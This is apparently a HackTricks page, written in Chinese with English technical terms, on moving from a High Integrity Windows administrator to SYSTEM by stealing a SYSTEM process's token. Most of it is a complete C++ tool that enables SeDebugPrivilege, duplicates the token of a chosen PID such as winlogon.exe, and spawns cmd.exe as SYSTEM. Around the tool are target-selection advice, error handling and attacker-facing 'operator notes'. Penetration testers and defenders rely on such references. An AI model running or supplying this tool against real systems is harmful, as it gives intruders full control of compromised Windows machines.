# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

本页讲的是从一个 **High Integrity administrator process** 到 **`NT AUTHORITY\SYSTEM`** 的 **手动** 方法：通过 **打开一个未受保护的 SYSTEM process，复制它的 token，并使用该 token 启动子进程**。

如果你只有 **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**，但 **无法打开合适的 SYSTEM process**，那么 **Potato / named-pipe** 路径通常更可靠：

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

如果你想要的不只是 `SYSTEM`，而是一个 **尽可能拥有更多 privileges 的 SYSTEM token**，也请查看：

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

在尝试 steal 一个 token 之前，先快速验证当前上下文：
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Practical notes:

- 一个 **High Integrity** admin token 通常足以 **enable `SeDebugPrivilege`** 并打开许多未受保护的 SYSTEM processes。
- **`CreateProcessWithTokenW` 需要调用者具备 `SeImpersonatePrivilege`**。如果该 API 返回 `1314`，在你已经复制出一个 SYSTEM primary token 之后，改用 `CreateProcessAsUserW`。
- 在现代 Windows 上，**`lsass.exe` 通常不是一个好目标**，因为 **LSA protection / PPL** 会阻止访问，即使是拥有 `SeDebugPrivilege` 的管理员也不行。优先选择 **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`**，或者一个以 SYSTEM 身份运行的较早期 **`svchost.exe`**。
- 并不是每个 SYSTEM process 都有同样有用的 token。如果你拿到了 SYSTEM 但发现缺少某些 privileges，尝试换一个 SYSTEM process，而不是直接认为 technique 失效。

## Pick the PID carefully

让这个方法稳定工作的最简单方式，是 **选择一个其 DACL 实际允许 Administrators query process 并 duplicate its token 的 SYSTEM process**。

优先测试的候选项：

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- 一些以 SYSTEM 身份运行的早期 `svchost.exe` 实例

默认避免：

- 在启用了 **RunAsPPL / LSA protection** 的主机上的 `lsass.exe`
- 任何即使在启用 `SeDebugPrivilege` 后仍返回 `Access denied` 的受保护 / security-sensitive processes

你可以使用以提升权限运行的 **Process Explorer** 或 **Process Hacker** 来检查候选 process 及其 token/ACLs。

### Code

下面的 code 来自 [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)。它允许你 **将 Process ID 作为参数指定**，并运行一个以所指定 process 的用户身份运行的 CMD。\
在 High Integrity process 中运行时，你可以 **指定一个以 System 运行的 process 的 PID**（例如 `winlogon`、`wininit`），并以 SYSTEM 身份执行一个 `cmd.exe`。
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-right notes

示例使用 `MAXIMUM_ALLOWED`，但在实际操作中，记住涉及的最小权限组件会更有用：

- `OpenProcessToken()` 只要求 **process handle** 以 **`PROCESS_QUERY_LIMITED_INFORMATION`** 打开。
- 要使用 `CreateProcessWithTokenW()`，**primary token handle** 必须具有 **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**。
- `DuplicateTokenEx()` 必须创建一个 **primary token**（`TokenPrimary`），而不只是 impersonation token。
- 如果你已经 impersonated SYSTEM，但 `CreateProcessWithTokenW()` 仍然失败并返回 `1314`，可以改试 `CreateProcessAsUserW()`。

这意味着，**用 `PROCESS_ALL_ACCESS` 打开目标进程通常是不必要的，而且比只请求查询 token 所需的权限更显眼**。

## Error

在某些情况下，你可能会尝试 impersonate System，但它不起作用，并显示类似下面的输出：
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
这意味着即使你正在以 High Integrity 运行，**你对那个目标 process/token 也没有足够的权限**。\
让我们使用 **Process Explorer**（或者你也可以使用 **Process Hacker**）查看当前对 `svchost.exe` processes 的 Administrator permissions：

1. 选择一个 `svchost.exe` process
2. 右键 --> Properties
3. 在 "Security" Tab 中，点击右下角的 "Permissions" 按钮
4. 点击 "Advanced"
5. 选择 "Administrators" 并点击 "Edit"
6. 点击 "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

前面的图片包含了 "Administrators" 对所选 process 拥有的所有 privileges（如你所见，在 `svchost.exe` 的情况下，它们只有 "Query" privileges）

查看 "Administrators" 对 `winlogon.exe` 拥有的 privileges：

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

在那个 process 中，Administrators 可以 "Read Memory" 和 "Read Permissions"，这大概率允许 Administrators 伪装该 process 使用的 token。

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: process DACL 阻止了你，或者目标是 **protected/PPL**。换一个 SYSTEM process。
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: 你的 token handle 打开时没有足够的 rights，或者目标 token DACL 阻止了 duplication。
- **`CreateProcessWithTokenW()` -> `1314`**: 调用者当前没有启用 **`SeImpersonatePrivilege`**。先尝试启用它，或者使用带有 duplicated primary token 的 `CreateProcessAsUserW()`。
- **`CreateProcessWithTokenW()` -> `1326`** 在前面失败之后：这通常只是表示前面的 token duplication/impersonation 步骤失败了，所以没有可用的 primary token 来启动子进程。

## Operator notes

- 当你已经是 **local admin + high integrity**，并且只想快速、手动地拿到 SYSTEM，而不想启动 service 或构造 named-pipe coercion chain 时，这个 technique 非常适合。
- 在加固过的 Windows 11 / Server 环境中，**LSA protection** 越来越常见，所以依赖 `lsass.exe` 总是可读的工作流并不可靠。**`winlogon.exe` / `wininit.exe` / `services.exe` 通常是更好的首选**。
- 如果你进入的是 **service account** 上下文，而不是一个提权的 admin desktop，那么 **Potato family** 通常比这一页的方法更适合。



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
